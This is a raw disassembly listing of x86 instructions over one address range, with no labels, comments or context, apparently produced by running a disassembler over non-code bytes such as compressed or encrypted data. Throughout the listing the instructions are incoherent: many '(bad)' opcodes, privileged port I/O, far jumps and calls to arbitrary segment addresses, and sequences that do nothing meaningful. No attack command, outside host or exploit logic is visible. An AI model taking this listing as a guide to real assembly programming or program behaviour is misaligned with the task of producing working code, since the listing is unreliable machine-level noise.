  52ba0e:	dec    edi
  52ba0f:	cmp    DWORD PTR [eax-0x75758ae1],ebx
  52ba15:	mov    edi,0xaa5ad5a1
  52ba1a:	gs jl  0x52ba5a
  52ba1d:	fwait
  52ba1e:	or     al,0x6c
  52ba20:	div    DWORD PTR [ecx]
  52ba22:	xchg   edi,eax
  52ba23:	aas    
  52ba24:	std    
  52ba25:	dec    esi
  52ba26:	in     al,dx
  52ba27:	stc    
  52ba28:	jg     0x52ba51
  52ba2a:	clc    
  52ba2b:	sbb    ah,ch
  52ba2d:	xchg   esi,eax
  52ba2e:	popa   
  52ba2f:	pusha  
  52ba30:	mov    edx,0x6073e8b6
  52ba35:	call   0xc980:0xc1fdf30d
  52ba3c:	arpl   WORD PTR [ecx],bp
  52ba3e:	shr    BYTE PTR [ecx+0x5bcfba56],cl
  52ba44:	(bad)  
  52ba45:	inc    edi
  52ba46:	clc    
  52ba47:	dec    esi
  52ba48:	mov    bh,bh
  52ba4a:	pop    esi
  52ba4b:	stos   BYTE PTR es:[edi],al
  52ba4c:	je     0x52ba3e
  52ba4e:	mov    bl,0x76
  52ba50:	mov    al,BYTE PTR ds:0x751fd949
  52ba56:	inc    ecx
  52ba57:	jmp    0x5d84:0x42f89037
  52ba5e:	aaa    
  52ba5f:	loopne 0x52bab0
  52ba61:	in     eax,0x33
  52ba63:	push   edi
  52ba64:	mul    esp
  52ba66:	in     eax,dx
  52ba67:	or     al,0xbe
  52ba69:	or     BYTE PTR [ebp-0x80],cl
  52ba6c:	push   ebp
  52ba6d:	inc    ebp
  52ba6e:	call   0x57b5f288
  52ba73:	add    dl,BYTE PTR [esi+0x5dc3b212]
  52ba79:	mov    esp,0x6570bb55
  52ba7e:	dec    esp
  52ba7f:	popa   
  52ba80:	xor    eax,0xadcc3626
  52ba85:	jno    0x52baf4
  52ba87:	fcmovb st,st(5)
  52ba89:	mov    ch,cl
  52ba8b:	inc    ebx
  52ba8c:	xor    al,0x65
  52ba8e:	fs out 0xf3,al
  52ba91:	cli    
  52ba92:	dec    ebp
  52ba93:	test   BYTE PTR [edx-0x5e],bh
  52ba96:	das    
  52ba97:	lods   al,BYTE PTR ss:[esi]
  52ba99:	int    0x73
  52ba9b:	(bad)
  52ba9e:	fcmovnb st,st(4)
  52baa0:	stc    
  52baa1:	cmp    esi,esi
  52baa3:	xor    eax,0x2250e636
  52baa8:	cld    
  52baa9:	mov    ds:0xc477d5f5,al
  52baae:	xchg   BYTE PTR [edi-0x17],ah
  52bab1:	ds repnz xor eax,0xc95dbcf2
  52bab8:	out    0xac,eax
  52baba:	sub    al,0xef
  52babc:	or     DWORD PTR [ebx],esp
  52babe:	inc    ecx
  52babf:	sbb    al,0x27
  52bac1:	push   ebx
  52bac2:	arpl   WORD PTR [ebx+0x22c3e64b],ax
  52bac8:	xlat   BYTE PTR ds:[ebx]
  52bac9:	pushf  
  52baca:	jmp    0x1c05:0xaff95e8a
  52bad1:	lahf   
  52bad2:	mov    DWORD PTR [eax],ebp
  52bad4:	pusha  
  52bad5:	pop    DWORD PTR [ecx-0x69db3d70]
  52badb:	outs   dx,DWORD PTR ds:[esi]
  52badc:	jmp    0x52bb3b
  52bade:	sbb    al,0x71
  52bae0:	mov    al,0x34
  52bae2:	mov    al,0xa0
  52bae4:	mov    edx,0x2b05af6a
  52bae9:	es (bad) 
  52baeb:	sub    edi,DWORD PTR [ebx+0x7adc2a82]
  52baf1:	data16 loopne 0x52bb15
  52baf4:	xor    DWORD PTR [esi-0x3acd8ea9],0xffffff88
  52bafb:	dec    eax
  52bafc:	fld    TBYTE PTR [ebx]
  52bafe:	add    BYTE PTR [edx-0xe],cl
  52bb01:	sub    ah,BYTE PTR [ebp-0x46449d9e]
  52bb07:	mov    ebx,DWORD PTR [ecx-0x74]
  52bb0a:	push   esi
  52bb0b:	in     eax,0x6c
  52bb0d:	push   0x97b5e6b
  52bb12:	scas   eax,DWORD PTR es:[edi]
  52bb13:	cmp    BYTE PTR [edx],ch
  52bb15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52bb16:	js     0x52bb14
  52bb18:	imul   edx,eax,0x46
  52bb1b:	jne    0x52bb72
  52bb1d:	nop
  52bb1e:	cmp    dh,BYTE PTR [ecx-0x5f4bea6d]
  52bb24:	fst    DWORD PTR [eax-0x5273e362]
  52bb2a:	xor    eax,0xafff8497
  52bb2f:	int    0xee
  52bb31:	in     eax,0xe3
  52bb33:	dec    esi
  52bb34:	imul   DWORD PTR [edi]
  52bb36:	adc    edx,DWORD PTR [eax+esi*2-0x5cfbf574]
  52bb3d:	lahf   
  52bb3e:	dec    bl
  52bb40:	nop
  52bb41:	dec    edi
  52bb42:	add    BYTE PTR [eax+eax*4+0x72083fd9],dh
  52bb49:	jns    0x52bb0a
  52bb4b:	adc    edi,DWORD PTR [ebx+ecx*1-0x7889874c]
  52bb52:	mov    ebp,0x68ca93eb
  52bb57:	xchg   esi,eax
  52bb58:	nop
  52bb59:	cmp    DWORD PTR [edi],0xa988fc95
  52bb5f:	in     al,dx
  52bb60:	mov    ebp,0xf9ca457a
  52bb65:	(bad)  
  52bb66:	mov    edx,0x7e65ed3
  52bb6b:	mov    bl,0x38
  52bb6d:	push   ebx
  52bb6e:	cwde   
  52bb6f:	xchg   edi,eax
  52bb70:	test   eax,0x2bb6a3f4
  52bb75:	pusha  
  52bb76:	inc    esp
  52bb77:	loope  0x52bb63
  52bb79:	fistp  WORD PTR [edx+0x42]
  52bb7c:	jp     0x52bb57
  52bb7e:	out    0x5d,al
  52bb80:	cli    
  52bb81:	push   edx
  52bb82:	inc    ebp
  52bb83:	je     0x52bbae
  52bb85:	or     DWORD PTR [edi-0x8],0x491ab412
  52bb8c:	ins    DWORD PTR es:[edi],dx
  52bb8d:	push   ss
  52bb8e:	lds    edx,FWORD PTR [ecx-0x34722888]
  52bb94:	(bad)  
  52bb95:	cdq    
  52bb96:	sub    BYTE PTR [ebx+edx*8-0x7fc3d58f],bh
  52bb9d:	gs push edx
  52bb9f:	stc    
  52bba0:	ds push edx
  52bba2:	std    
  52bba3:	ins    DWORD PTR es:[edi],dx
  52bba4:	jecxz  0x52bc07
  52bba6:	mov    esp,DWORD PTR [edx]
  52bba8:	inc    eax
  52bba9:	popf   
  52bbaa:	loopne 0x52bba4
  52bbac:	and    BYTE PTR [edx+0xc89f82c],dl
  52bbb2:	stos   BYTE PTR es:[edi],al
  52bbb3:	mov    BYTE PTR [ecx+eax*8-0x33355e29],al
  52bbba:	inc    ecx
  52bbbb:	mov    BYTE PTR [ebx-0xeacda86],ah
  52bbc1:	sar    cl,0xed
  52bbc4:	lods   eax,DWORD PTR ds:[esi]
  52bbc5:	mov    edi,0x322d2460
  52bbca:	cmc    
  52bbcb:	loope  0x52bb52
  52bbcd:	enter  0xdb7b,0x72
  52bbd1:	mov    eax,0x813b9049
  52bbd6:	or     ah,BYTE PTR [edx-0xb2e9a5c]
  52bbdc:	inc    ebx
  52bbdd:	fnstsw WORD PTR [ebp-0x7ef1923b]
  52bbe3:	les    ebx,FWORD PTR [esi+esi*1+0x37]
  52bbe7:	ja     0x52bba5
  52bbe9:	or     eax,0xfbfb008
  52bbee:	ins    DWORD PTR es:[edi],dx
  52bbef:	in     al,dx
  52bbf0:	jmp    0x47b9:0x8ba7a34e
  52bbf7:	cmp    DWORD PTR [ebp-0x4b],ecx
  52bbfa:	xor    BYTE PTR [edx+0x42c3f522],0x9a
  52bc01:	xor    DWORD PTR ds:0x19110f7a,ecx
  52bc07:	mov    cl,0xd1
  52bc09:	mov    esp,0x1c723179
  52bc0e:	adc    ebx,esi
  52bc10:	push   ebp
  52bc11:	add    eax,0x552b20a1
  52bc16:	push   cs
  52bc17:	jmp    0xc2ec:0xfd9e605e
  52bc1e:	lock sahf 
  52bc20:	inc    edx
  52bc21:	loop   0x52bc1c
  52bc23:	inc    edi
  52bc24:	or     eax,DWORD PTR [esi-0x6a79e206]
  52bc2a:	retf   0x4efa
  52bc2d:	push   ecx
  52bc2e:	jp     0x52bc2c
  52bc30:	aad    0xb8
  52bc32:	adc    al,bh
  52bc34:	scas   al,BYTE PTR es:[edi]
  52bc35:	inc    dh
  52bc37:	stc    
  52bc38:	xchg   ebp,eax
  52bc39:	push   esi
  52bc3a:	push   ds
  52bc3b:	and    bh,bh
  52bc3d:	mov    edx,0x9bc28b58
  52bc42:	xor    eax,0x893570bf
  52bc47:	stc    
  52bc48:	rol    BYTE PTR [ebx],0x56
  52bc4b:	not    BYTE PTR [ecx+0x15]
  52bc4e:	push   cs
  52bc4f:	mov    ebx,cs
  52bc51:	xchg   ecx,eax
  52bc52:	jmp    0x52bc00
  52bc54:	mov    edi,0x52f2ee23
  52bc59:	jnp    0x52bc2c
  52bc5b:	mov    ds:0xc16e44eb,al
  52bc60:	lahf   
  52bc61:	retf   0x41f4
  52bc64:	jmp    0x52bc32
  52bc66:	mov    bh,0xe9
  52bc68:	mov    ah,0x72
  52bc6a:	scas   al,BYTE PTR es:[edi]
  52bc6b:	lea    ebp,[edx+ecx*2+0x2f]
  52bc6f:	sbb    BYTE PTR [esi],dl
  52bc71:	loop   0x52bc0f
  52bc73:	(bad)  
  52bc74:	sar    DWORD PTR [ecx-0x2],cl
  52bc77:	inc    edx
  52bc78:	add    edx,DWORD PTR [ecx]
  52bc7a:	stc    
  52bc7b:	jns    0x52bc13
  52bc7d:	fwait
  52bc7e:	retf   
  52bc7f:	jp     0x52bcb0
  52bc81:	mov    ebx,0xe7b66a7
  52bc86:	ja     0x52bc09
  52bc88:	out    dx,al
  52bc89:	mov    ds:0x3df852fa,al
  52bc8e:	mov    ebp,0xf7af5474
  52bc93:	pop    edx
  52bc94:	mov    cl,0x40
  52bc96:	jge    0x52bc48
  52bc98:	xor    edi,ebx
  52bc9a:	test   eax,0x16deda56
  52bca0:	pop    ebx
  52bca1:	sbb    eax,0x10da6c81
  52bca6:	in     eax,dx
  52bca7:	xchg   edi,eax
  52bca8:	mov    ds:0x69bcdd2,al
  52bcad:	sub    al,0x38
  52bcaf:	and    dl,bh
  52bcb1:	cdq    
  52bcb2:	(bad)  
  52bcb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52bcb4:	imul   esp,DWORD PTR [ebp+0x41],0xffffffe5
  52bcb8:	mov    esp,0x3d7e91
  52bcbd:	cld    
  52bcbe:	push   es
  52bcbf:	dec    edx
  52bcc0:	xchg   BYTE PTR [eax-0x449670c1],dl
  52bcc6:	lock mov ds:0xff9e292c,eax
  52bccc:	xchg   ecx,eax
  52bccd:	xchg   BYTE PTR [edx+ebp*8-0x5cef119d],dh
  52bcd4:	pop    es
  52bcd5:	mov    ds:0x111c9531,eax
  52bcda:	imul   eax,DWORD PTR [ecx-0x53f5b090],0x71
  52bce1:	jne    0x52bc63
  52bce3:	mov    ebx,0xcbb9ae30
  52bce8:	adc    eax,0xc85b04f7
  52bced:	sub    al,0x27
  52bcef:	and    DWORD PTR [edi-0x3541b53b],edx
  52bcf5:	mov    eax,0x6a2952a2
  52bcfa:	jmp    DWORD PTR [eax+eax*2]
  52bcfd:	xor    DWORD PTR [edi-0x62],0x51
  52bd01:	or     al,0x20
  52bd03:	nop
  52bd04:	das    
  52bd05:	push   0x89cc082b
  52bd0a:	test   BYTE PTR [esi],0x22
  52bd0d:	cs lahf 
  52bd0f:	jle    0x52bccf
  52bd11:	or     eax,0x4ec2d3b8
  52bd16:	inc    ebp
  52bd17:	and    BYTE PTR [ebx-0x4b9afbea],ch
  52bd1d:	sub    cl,BYTE PTR [edi]
  52bd1f:	sbb    edx,DWORD PTR [ebx+eiz*8+0x7d]
  52bd23:	inc    ebx
  52bd24:	pop    esp
  52bd25:	call   0x64348988
  52bd2a:	xor    bl,BYTE PTR [ebx+0x35f7e817]
  52bd30:	and    DWORD PTR [ebx],ecx
  52bd32:	mov    bl,0xaf
  52bd34:	dec    edi
  52bd35:	inc    ecx
  52bd36:	push   edi
  52bd37:	add    al,0x80
  52bd39:	xor    BYTE PTR [edi+ebp*1+0x23],ch
  52bd3d:	fsubr  QWORD PTR [esi]
  52bd3f:	jno    0x52bd95
  52bd41:	(bad)  
  52bd42:	jg     0x52bce3
  52bd44:	jns    0x52bd3f
  52bd46:	test   al,0x4e
  52bd48:	stos   DWORD PTR es:[edi],eax
  52bd49:	jbe    0x52bd18
  52bd4b:	retf   0x867f
  52bd4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52bd4f:	es cmp al,0xea
  52bd52:	add    ebp,ebp
  52bd54:	sub    BYTE PTR [ebp-0x5e1fe12d],0x93
  52bd5b:	loop   0x52bd98
  52bd5d:	mov    bh,0xf2
  52bd5f:	ror    ah,cl
  52bd61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52bd62:	xchg   esi,eax
  52bd63:	(bad)  [edi]
  52bd65:	mov    ah,0x42
  52bd67:	xchg   edi,eax
  52bd68:	cli    
  52bd69:	mov    ds:0x415ba3b8,eax
  52bd6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52bd6f:	shl    DWORD PTR [esi+0x55f624b3],1
  52bd75:	push   0x70
  52bd77:	aam    0xce
  52bd79:	pop    ecx
  52bd7a:	mov    bh,0x3d
  52bd7c:	sub    dl,ch
  52bd7e:	out    dx,al
  52bd7f:	sub    DWORD PTR [ebp+0x4e],edx
  52bd82:	add    DWORD PTR [eax+0x48eb5bc7],ecx
  52bd88:	xchg   ecx,eax
  52bd89:	xchg   cl,bl
  52bd8b:	das    
  52bd8c:	adc    BYTE PTR ds:0x8f2ab096,bl
  52bd92:	xor    al,0x9
  52bd94:	mov    BYTE PTR [edi+0x7a54e1cc],ah
  52bd9a:	cmp    al,0x6a
  52bd9c:	sub    cl,BYTE PTR [ebx]
  52bd9e:	sub    DWORD PTR ds:0xfae99069,edi
  52bda4:	push   ds
  52bda5:	cdq    
  52bda6:	in     al,0xf
  52bda8:	jle    0x52be10
  52bdaa:	inc    esi
  52bdab:	inc    esp
  52bdac:	(bad)  
  52bdad:	dec    eax
  52bdae:	scas   al,BYTE PTR es:[edi]
  52bdaf:	xchg   esi,eax
  52bdb0:	loop   0x52bd5e
  52bdb2:	int3   
  52bdb3:	call   0x3a052cd
  52bdb8:	xlat   BYTE PTR ds:[ebx]
  52bdb9:	int    0xcb
  52bdbb:	jmp    0x4455:0xce4ba155
  52bdc2:	(bad)  
  52bdc3:	lock out 0x5e,eax
  52bdc6:	or     DWORD PTR fs:[ebp+0xb],0xd4f2b1d1
  52bdce:	mov    dl,0x67
  52bdd0:	out    dx,eax
  52bdd1:	xchg   esi,eax
  52bdd2:	frstor [edi+0x1c]
  52bdd5:	stc    
  52bdd6:	adc    al,0xd8
  52bdd8:	pop    edi
  52bdd9:	fistp  QWORD PTR [edi+0x27]
  52bddc:	lea    esi,[edi]
  52bdde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52bddf:	sti    
  52bde0:	pop    edx
  52bde1:	add    DWORD PTR [edi],0x17
  52bde4:	mov    ds:0xe7ca67b7,eax
  52bde9:	shl    DWORD PTR [esi+0x9],cl
  52bdec:	add    ebp,DWORD PTR [ebx+0x2fb4e7cb]
  52bdf2:	pop    ds
  52bdf3:	push   eax
  52bdf4:	and    BYTE PTR [ecx+ecx*8-0x59],bl
  52bdf8:	rcr    ebx,1
  52bdfa:	mov    ecx,0xbc9375dd
  52bdff:	or     al,0x26
  52be01:	pop    eax
  52be02:	sbb    ebp,DWORD PTR ds:0xb6754bcf
  52be08:	xchg   edx,eax
  52be09:	std    
  52be0a:	or     edx,esi
  52be0c:	sub    BYTE PTR [edx],cl
  52be0e:	add    al,0xdc
  52be10:	jno    0x52bd9d
  52be12:	jl     0x52bde6
  52be14:	(bad)  
  52be15:	in     eax,0xd8
  52be17:	aam    0xe9
  52be19:	cld    
  52be1a:	jecxz  0x52bdde
  52be1c:	jmp    0x8097cac1
  52be21:	add    eax,0xc2605376
  52be26:	push   esi
  52be27:	call   0xecf4:0x309502b6
  52be2e:	je     0x52be0a
  52be30:	enter  0x8a5,0x6b
  52be34:	stc    
  52be35:	outs   dx,DWORD PTR ds:[esi]
  52be36:	and    DWORD PTR [ecx+0x5cca1e1b],eax
  52be3c:	loope  0x52be52
  52be3e:	jnp    0x52be61
  52be40:	inc    edi
  52be41:	xor    al,0x90
  52be43:	inc    esp
  52be44:	cmp    ah,dl
  52be46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52be47:	js     0x52be54
  52be49:	in     eax,dx
  52be4a:	or     DWORD PTR [ebx-0x161f8656],ebx
  52be50:	lea    ebx,[ecx-0x15]
  52be53:	mov    ebx,gs
  52be55:	jp     0x52be5d
  52be57:	add    eax,0xfe2a82c6
  52be5c:	imul   edx,DWORD PTR [ebx-0x6905cf0e],0x2e
  52be63:	scas   eax,DWORD PTR es:[edi]
  52be64:	pop    eax
  52be65:	jmp    0xf193:0x9ba522b8
  52be6c:	and    eax,0x53269ec8
  52be71:	scas   al,BYTE PTR es:[edi]
  52be72:	mov    bl,0x7b
  52be74:	mov    bl,0x3a
  52be76:	pop    edx
  52be77:	int3   
  52be78:	xlat   BYTE PTR ds:[ebx]
  52be79:	fsubr  QWORD PTR [ecx+ebp*4-0x57dcffe5]
  52be80:	ret    
  52be81:	mov    bl,bh
  52be83:	jecxz  0x52be95
  52be85:	outs   dx,BYTE PTR ds:[esi]
  52be86:	imul   eax,esp,0x12f216fc
  52be8c:	adc    al,0x47
  52be8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52be8f:	mov    bl,al
  52be91:	add    ah,ch
  52be93:	push   esi
  52be94:	add    eax,0x67d47365
  52be99:	jno    0x52be34
  52be9b:	push   ebx
  52be9c:	sub    al,0xef
  52be9e:	inc    ebx
  52be9f:	jge    0x52be58
  52bea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52bea2:	xor    DWORD PTR [ebx+ecx*1-0x2a],0xffffffd5
  52bea7:	(bad)  
  52bea9:	push   DWORD PTR [esi-0x3d]
  52beac:	jns    0x52bed1
  52beae:	inc    eax
  52beaf:	js     0x52bef9
  52beb1:	cmp    eax,0x1136078c
  52beb6:	push   esp
  52beb7:	arpl   WORD PTR [esi],ax
  52beb9:	jo     0x52be57
  52bebb:	mov    eax,ss
  52bebd:	pusha  
  52bebe:	pop    ebp
  52bebf:	in     al,dx
  52bec0:	call   0x570e8596
  52bec5:	sar    BYTE PTR [edx+0x4b99a752],1
  52becb:	mov    bh,0x27
  52becd:	in     eax,0xfd
  52becf:	inc    ebp
  52bed0:	js     0x52be7a
  52bed2:	xchg   BYTE PTR [edi-0x6163f645],dh
  52bed8:	bound  ecx,QWORD PTR [esi-0x9]
  52bedb:	jmp    0xa79:0x2d8f58b8
  52bee2:	inc    ecx
  52bee3:	lods   al,BYTE PTR ds:[esi]
  52bee4:	xchg   esp,eax
  52bee5:	xor    eax,0x37ed1ec7
  52beea:	cmp    al,dh
  52beec:	es addr16 jmp 0x52beca
  52bef0:	jo     0x52be98
  52bef2:	nop
  52bef3:	in     eax,dx
  52bef4:	ret    0x5781
  52bef7:	scas   eax,DWORD PTR es:[edi]
  52bef8:	mov    edx,0x280b1364
  52befd:	aad    0xab
  52beff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52bf00:	cwde   
  52bf01:	cdq    
  52bf02:	ret    
  52bf03:	jmp    0x52bf62
  52bf05:	mov    eax,0x9416951c
  52bf0a:	in     eax,dx
  52bf0b:	add    BYTE PTR [ecx-0x54],cl
  52bf0e:	cmp    eax,0xc05216e1
  52bf13:	dec    ecx
  52bf14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52bf15:	lea    ebx,[ebx-0x55]
  52bf18:	icebp  
  52bf19:	mov    dl,0x91
  52bf1b:	pop    ebx
  52bf1c:	cmp    eax,0x46296b17
  52bf21:	mov    eax,ds:0x176aa6a4
  52bf26:	(bad)  
  52bf27:	hlt    
  52bf28:	xor    ebx,edi
  52bf2a:	cmp    eax,edx
  52bf2c:	call   0xc38d:0xeb2e76a9
  52bf33:	std    
  52bf34:	mov    cs,esi
  52bf36:	or     BYTE PTR [ebx+0x30],bl
  52bf39:	iret   
  52bf3a:	test   al,0x53
  52bf3c:	fidivr WORD PTR [edx-0x19]
  52bf3f:	retf   0xb3ab
  52bf42:	inc    esi
  52bf43:	jae    0x52bfa6
  52bf45:	or     edx,ebx
  52bf47:	push   ss
  52bf48:	jecxz  0x52bfc9
  52bf4a:	(bad)  
  52bf4b:	and    al,0x95
  52bf4d:	es add al,0xa7
  52bf50:	jo     0x52bef7
  52bf52:	jo     0x52bf0e
  52bf54:	xor    eax,0xe5e41731
  52bf59:	and    ah,0x18
  52bf5c:	aas    
  52bf5d:	test   DWORD PTR [ebx+0x773a2457],0x5807d913
  52bf67:	out    dx,eax
  52bf68:	std    
  52bf69:	ss popa 
  52bf6b:	xchg   ebp,eax
  52bf6c:	or     BYTE PTR [ecx-0x16],bl
  52bf6f:	imul   esi,DWORD PTR [edi+0xe1e525c],0x1f
  52bf76:	aaa    
  52bf77:	mov    bl,BYTE PTR [ebx-0x55]
  52bf7a:	sbb    al,0x11
  52bf7c:	sbb    eax,0x71c8299c
  52bf81:	pop    ecx
  52bf82:	rol    BYTE PTR [esi+0x1c],cl
  52bf85:	push   esp
  52bf86:	or     al,dh
  52bf88:	gs test eax,0xff865426
  52bf8e:	cmp    al,0x81
  52bf90:	mov    ds:0x3f931625,eax
  52bf95:	mov    ?,esp
  52bf97:	icebp  
  52bf98:	cdq    
  52bf99:	sub    BYTE PTR [esi+0x22],0xf7
  52bf9d:	jle    0x52bfd6
  52bf9f:	nop
  52bfa0:	fwait
  52bfa1:	xor    bh,BYTE PTR [esi+0x54]
  52bfa4:	sbb    esp,DWORD PTR [ebx]
  52bfa6:	add    eax,0xab74e3a8
  52bfab:	jmp    0xbefe206e
  52bfb0:	inc    esp
  52bfb1:	jne    0x52bf3c
  52bfb3:	sub    DWORD PTR [esi],ebp
  52bfb5:	adc    DWORD PTR ds:0x6d6b2f53,ecx
  52bfbb:	adc    al,0x7a
  52bfbd:	addr16 pop ds
  52bfbf:	(bad)  
  52bfc0:	cmp    al,0x24
  52bfc2:	pop    ebp
  52bfc3:	fcomp  QWORD PTR fs:[esi+0x34]
  52bfc7:	mov    edx,0x11f9f473
  52bfcc:	or     BYTE PTR [edi-0x4f8038d1],bh
  52bfd2:	xchg   edi,eax
  52bfd3:	fisttp DWORD PTR [esi]
  52bfd5:	sahf   
  52bfd6:	sar    DWORD PTR [eax-0x5a2cd8f7],0xd1
  52bfdd:	sub    al,0x36
  52bfdf:	adc    DWORD PTR [ebx+0x5d],ebp
  52bfe2:	add    eax,0x1a0839d2
  52bfe7:	ror    edx,0x94
  52bfea:	pushf  
  52bfeb:	add    dh,ah
  52bfed:	fsubr  DWORD PTR [edi-0x448e07f9]
  52bff3:	adc    eax,0xdd43104
  52bff8:	xchg   ebx,eax
  52bff9:	inc    edi
  52bffa:	push   0xc3b8eb2e
  52bfff:	sbb    al,0x36
  52c001:	out    dx,al
  52c002:	out    0xd3,al
  52c004:	jle    0x52c004
  52c006:	inc    eax
  52c007:	sbb    BYTE PTR [esp+eiz*8-0x3cc05ec0],al
  52c00e:	mov    cl,BYTE PTR [edx-0x9]
  52c011:	xchg   ebx,eax
  52c012:	out    0x40,al
  52c014:	push   esi
  52c015:	and    edi,DWORD PTR [ecx-0x13]
  52c018:	sub    al,0x64
  52c01a:	mov    dl,0x94
  52c01c:	ins    BYTE PTR es:[edi],dx
  52c01d:	mov    ah,0x43
  52c01f:	xor    ebp,DWORD PTR [edx-0x79]
  52c022:	jmp    0x3c1e:0xe5bfbb3b
  52c029:	test   eax,0x50310b9e
  52c02e:	adc    BYTE PTR [ecx-0x38],al
  52c031:	dec    eax
  52c032:	xor    DWORD PTR [edx],0x8878c500
  52c038:	jmp    DWORD PTR [edi+0x59dc91b1]
  52c03e:	dec    esp
  52c03f:	push   eax
  52c040:	push   esi
  52c041:	inc    edx
  52c042:	and    eax,DWORD PTR [eax]
  52c044:	cmp    ebp,ecx
  52c046:	cmc    
  52c047:	and    eax,0x112b696c
  52c04c:	pop    es
  52c04d:	sti    
  52c04e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52c04f:	pop    edi
  52c050:	pop    edi
  52c051:	data16 cmc 
  52c053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52c054:	xchg   ebp,eax
  52c055:	div    DWORD PTR [edx+0x69]
  52c058:	lods   eax,DWORD PTR ds:[esi]
  52c059:	xor    cl,BYTE PTR [eax+0x38]
  52c05c:	outs   dx,BYTE PTR ds:[esi]
  52c05d:	cmp    edx,DWORD PTR [eax-0x6cf7382b]
  52c063:	aad    0xee
  52c065:	add    al,0xdd
  52c067:	adc    DWORD PTR [eax+eiz*4+0x7b2bbb42],eax
  52c06e:	mov    ecx,0xcb513cee
  52c073:	add    DWORD PTR [edi+0x7cbbb3bb],ebx
  52c079:	cld    
  52c07a:	fsub   st(7),st
  52c07c:	or     ch,ch
  52c07e:	pop    es
  52c07f:	fnstenv [eax+0x3705c108]
  52c085:	xor    al,0x18
  52c087:	inc    edx
  52c088:	jp     0x52c024
  52c08a:	fidivr DWORD PTR [esi+0x78530e50]
  52c090:	ret    
  52c091:	fsub   QWORD PTR [edx+0x794a7758]
  52c097:	xchg   esp,eax
  52c098:	sahf   
  52c099:	jbe    0x52c110
  52c09b:	loope  0x52c0ae
  52c09d:	adc    cl,dl
  52c09f:	ror    ebp,1
  52c0a1:	nop
  52c0a2:	xchg   edx,eax
  52c0a3:	retf   0x23af
  52c0a6:	fld1   
  52c0a8:	call   0x8822:0x2b7b17fa
  52c0af:	sahf   
  52c0b0:	xor    DWORD PTR [edx],ecx
  52c0b2:	test   DWORD PTR [edi+0x1e],edi
  52c0b5:	(bad)  
  52c0b6:	or     eax,0xea090048
  52c0bb:	xor    BYTE PTR [ebp+esi*1-0x6db8532c],bh
  52c0c2:	jle    0x52c068
  52c0c4:	in     eax,0xc5
  52c0c6:	je     0x52c11c
  52c0c8:	jecxz  0x52c117
  52c0ca:	pop    esi
  52c0cb:	dec    edi
  52c0cc:	jne    0x52c0fc
  52c0ce:	xor    BYTE PTR [ecx+0x57d3e3a4],0x8
  52c0d5:	lds    esi,FWORD PTR [eax+ebx*4-0x37]
  52c0d9:	inc    ebp
  52c0da:	(bad)  
  52c0db:	and    al,0x89
  52c0dd:	das    
  52c0de:	(bad)  
  52c0e0:	mov    edx,0xc2ef84a0
  52c0e5:	sbb    eax,DWORD PTR [edx]
  52c0e7:	jbe    0x52c0dc
  52c0e9:	jge    0x52c12e
  52c0eb:	iret   
  52c0ec:	xchg   esp,eax
  52c0ed:	repnz test eax,0xc018f88
  52c0f3:	pop    ebx
  52c0f4:	loope  0x52c081
  52c0f6:	xchg   ecx,eax
  52c0f7:	inc    ebp
  52c0f8:	cmp    BYTE PTR [edi-0x4532560d],dl
  52c0fe:	lods   eax,DWORD PTR ds:[esi]
  52c0ff:	mov    dl,0x85
  52c101:	loope  0x52c0b0
  52c103:	aas    
  52c104:	neg    DWORD PTR [ecx]
  52c106:	xlat   BYTE PTR ds:[ebx]
  52c107:	push   ebx
  52c108:	pop    ss
  52c109:	call   0xa277:0x65bd30f5
  52c110:	cmp    edi,DWORD PTR [eax]
  52c112:	and    BYTE PTR [edi-0x60],0xf0
  52c116:	mov    BYTE PTR [esi-0x44],al
  52c119:	dec    edx
  52c11a:	jb     0x52c0d2
  52c11c:	dec    esi
  52c11d:	out    dx,eax
  52c11e:	sbb    ah,BYTE PTR [edx+0x4cdf4a08]
  52c124:	popw   ss
  52c126:	xchg   cl,ah
  52c128:	cmp    eax,esi
  52c12a:	int    0x8e
  52c12c:	sbb    eax,0xfb59a3fd
  52c131:	push   cs
  52c132:	push   0x43
  52c134:	mov    ebx,0x3170264c
  52c139:	xchg   DWORD PTR [eax+ecx*1-0x1ae32f4c],ebx
  52c140:	xchg   edi,eax
  52c141:	mov    cl,0x65
  52c143:	cmp    al,0x81
  52c145:	mov    al,0x64
  52c147:	lds    eax,FWORD PTR [edi]
  52c149:	aad    0xac
  52c14b:	pop    ss
  52c14c:	sbb    eax,0x9c0a4fe9
  52c151:	fcom   st(5)
  52c153:	or     DWORD PTR [ebx-0x29],0xffffffd9
  52c157:	pop    edi
  52c158:	icebp  
  52c159:	test   BYTE PTR es:[esi],cl
  52c15c:	or     eax,0xfbb8795c
  52c161:	pusha  
  52c162:	mov    bh,0x42
  52c164:	xchg   ecx,eax
  52c165:	imul   edi,DWORD PTR [eax],0xdfedf085
  52c16b:	and    esi,DWORD PTR [eax+0x6e40b520]
  52c171:	jbe    0x52c142
  52c173:	cli    
  52c174:	mov    ss,WORD PTR [ebp+0x7af8eb07]
  52c17a:	arpl   bx,sp
  52c17c:	push   ebp
  52c17d:	mov    eax,ds:0xdc412d98
  52c182:	mov    WORD PTR [esi],gs
  52c184:	pop    ebp
  52c185:	call   0x5ca6:0xdab7a447
  52c18c:	pop    ds
  52c18d:	rcl    ebp,1
  52c18f:	popa   
  52c190:	dec    esp
  52c191:	daa    
  52c192:	in     eax,dx
  52c193:	or     esp,esi
  52c195:	xor    al,0xd6
  52c197:	jg     0x52c1e3
  52c199:	push   eax
  52c19a:	outs   dx,DWORD PTR ds:[esi]
  52c19b:	cmp    al,0xa9
  52c19d:	pop    edx
  52c19e:	xchg   ebp,eax
  52c19f:	dec    ebx
  52c1a0:	jnp    0x52c139
  52c1a2:	das    
  52c1a3:	xchg   ecx,eax
  52c1a4:	leave  
  52c1a5:	or     ch,BYTE PTR [esi]
